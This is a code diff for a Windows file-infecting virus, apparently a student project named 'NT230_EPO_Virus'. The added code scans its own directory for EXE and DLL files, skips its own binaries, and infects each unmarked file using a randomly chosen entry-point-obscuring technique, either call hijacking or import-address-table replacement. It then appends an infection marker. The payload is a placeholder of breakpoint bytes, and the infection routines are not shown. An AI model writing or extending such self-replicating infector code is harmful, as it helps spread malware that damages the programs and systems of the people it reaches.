@@ -83,6 +83,10 @@ void InfectPEFilesInDirectory() {
     char target_path[MAX_PATH];
     struct _finddata_t fileinfo;
     intptr_t handle;
+    
+    // Simple virus payload (will be inserted into infected files)
+    // This is placeholder - in real scenario would be actual shellcode
+    const unsigned char payload[] = { 0xCC, 0xCC, 0xCC, 0xCC };
 
     // Get current executable directory
     if (GetModuleFileNameA(NULL, current_dir, MAX_PATH) == 0) {
@@ -93,15 +97,16 @@ void InfectPEFilesInDirectory() {
     char dir_only[MAX_PATH];
     GetFileDirectory(current_dir, dir_only, MAX_PATH);
 
-    // Search for all EXE and DLL files
+    // Search for all EXE files
     snprintf(search_path, MAX_PATH, "%s\\*.exe", dir_only);
 
     handle = _findfirst(search_path, &fileinfo);
 
     if (handle != -1) {
         do {
-            // Skip if it's the current executable
-            if (strcmp(fileinfo.name, "virus_infector.exe") == 0 || 
+            // Skip if it's the current executable (virus itself)
+            if (strcmp(fileinfo.name, "NT230_EPO_Virus.exe") == 0 || 
+                strcmp(fileinfo.name, "virus_infector.exe") == 0 || 
                 strcmp(fileinfo.name, "virus.exe") == 0) {
                 continue;
             }
@@ -110,12 +115,35 @@ void InfectPEFilesInDirectory() {
 
             // Check if already infected
             if (!IsFileInfected(target_path)) {
-                // Attempt infection - in real scenario, would apply EPO techniques
-                // For now, just add marker to demonstrate infection capability
-                FILE* file = fopen(target_path, "ab");
-                if (file) {
-                    fwrite(INFECTION_MARKER, 1, INFECTION_MARKER_SIZE, file);
-                    fclose(file);
+                printf("[*] Found uninfected file: %s\n", fileinfo.name);
+                
+                // Choose random EPO technique (50/50)
+                if (rand() % 2 == 0) {
+                    printf("[+] Applying Call Hijacking EPO...\n");
+                    if (InfectPEFile_CallHijacking(target_path, (const char*)payload, sizeof(payload))) {
+                        printf("[+] Successfully infected with Call Hijacking!\n");
+                        // Add infection marker
+                        FILE* file = fopen(target_path, "ab");
+                        if (file) {
+                            fwrite(INFECTION_MARKER, 1, INFECTION_MARKER_SIZE, file);
+                            fclose(file);
+                        }
+                    } else {
+                        printf("[-] Failed to infect with Call Hijacking\n");
+                    }
+                } else {
+                    printf("[+] Applying IAT Replacing EPO...\n");
+                    if (InfectPEFile_IATReplacing(target_path, (const char*)payload, sizeof(payload))) {
+                        printf("[+] Successfully infected with IAT Replacing!\n");
+                        // Add infection marker
+                        FILE* file = fopen(target_path, "ab");
+                        if (file) {
+                            fwrite(INFECTION_MARKER, 1, INFECTION_MARKER_SIZE, file);
+                            fclose(file);
+                        }
+                    } else {
+                        printf("[-] Failed to infect with IAT Replacing\n");
+                    }
                 }
             }
 
@@ -133,10 +161,29 @@ void InfectPEFilesInDirectory() {
             snprintf(target_path, MAX_PATH, "%s\\%s", dir_only, fileinfo.name);
 
             if (!IsFileInfected(target_path)) {
-                FILE* file = fopen(target_path, "ab");
-                if (file) {
-                    fwrite(INFECTION_MARKER, 1, INFECTION_MARKER_SIZE, file);
-                    fclose(file);
+                printf("[*] Found uninfected DLL: %s\n", fileinfo.name);
+                
+                // Choose random EPO technique
+                if (rand() % 2 == 0) {
+                    printf("[+] Applying Call Hijacking EPO...\n");
+                    if (InfectPEFile_CallHijacking(target_path, (const char*)payload, sizeof(payload))) {
+                        printf("[+] Successfully infected with Call Hijacking!\n");
+                        FILE* file = fopen(target_path, "ab");
+                        if (file) {
+                            fwrite(INFECTION_MARKER, 1, INFECTION_MARKER_SIZE, file);
+                            fclose(file);
+                        }
+                    }
+                } else {
+                    printf("[+] Applying IAT Replacing EPO...\n");
+                    if (InfectPEFile_IATReplacing(target_path, (const char*)payload, sizeof(payload))) {
+                        printf("[+] Successfully infected with IAT Replacing!\n");
+                        FILE* file = fopen(target_path, "ab");
+                        if (file) {
+                            fwrite(INFECTION_MARKER, 1, INFECTION_MARKER_SIZE, file);
+                            fclose(file);
+                        }
+                    }
                 }
             }
 
